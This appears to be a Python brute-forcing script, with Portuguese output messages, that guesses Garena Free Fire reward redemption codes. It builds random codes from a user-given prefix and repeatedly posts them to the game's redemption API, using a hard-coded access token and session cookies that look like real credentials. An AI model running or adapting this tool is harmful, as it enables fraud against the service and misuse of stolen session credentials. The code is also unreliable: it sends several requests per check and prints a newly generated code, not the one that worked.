#!/usr/bin/env python3
import random
import string, time
import argparse
from bs4 import BeautifulSoup
import requests
from requests.adapters import HTTPAdapter
import rich
from rich import print
from urllib3.util.retry import Retry

parser = argparse.ArgumentParser()
parser.add_argument("-c", "--codigin", help="codigin", dest="codigin", type=str, required=True)
args = parser.parse_args()
Inic_codigin = str(args.codigin)


def gerador_codingin():

    a = ''.join(random.choice(string.ascii_uppercase) for _ in range(1))

    b = ''.join(random.choice(string.digits) for _ in range(1))

    c = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))

    return "{}{}{}{}".format(Inic_codigin, a, b, c)


def reques():
    
    access_token = "6dd3ee416aea38f2b9daeb9dde4c2b9894a63aa56f1eb2fed7748c95625d7853" 
    codigin = "{}{}{}".format('"', gerador_codingin(),'"')
    paylod = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Cookie": "_ga=GA1.2.1580628210.1648270858; _gid=GA1.2.887630064.1648270858; apple_state_key=ff876a66acc115ecb16c2a644eab852a; token_session=efe81d9e7bbef6b7c36e6a89d6bc9100b549d5fdb479b633cc3544f5cd0c372b910fd334c10b28af4d4d8e745f9d5504",
    "Content-Type": "application/json",
    "Access-Token": access_token,
    "Origin": "https://reward.ff.garena.com",
    }
    data_json = {"serialno": codigin}

    url_google_login = "https://prod-api.reward.ff.garena.com/redemption/api/game/ff/multiple/redeem/"
    session = requests.Session()
    google = session.post(url_google_login, headers=paylod, json=data_json)
    soup = (google.text)
    
    
    return soup


def validacao():
    while "error_invalid_serialno" in reques():
        print ("[red][-] Injetando Codigin:[/red] {}[red][-][/red]".format(gerador_codingin()))
    if "error_too_many_requests" in reques():
        print ("[yellow][!] Muitas Tentativas [!][/yellow]")
    elif "token" in reques():
        print("[yellow][!] Token Expirado [!][/yellow]")
    else:
        print ("[green][+] Codigin Encontrado:[/green] {}[green][+][/green]".format(gerador_codingin()))
validacao()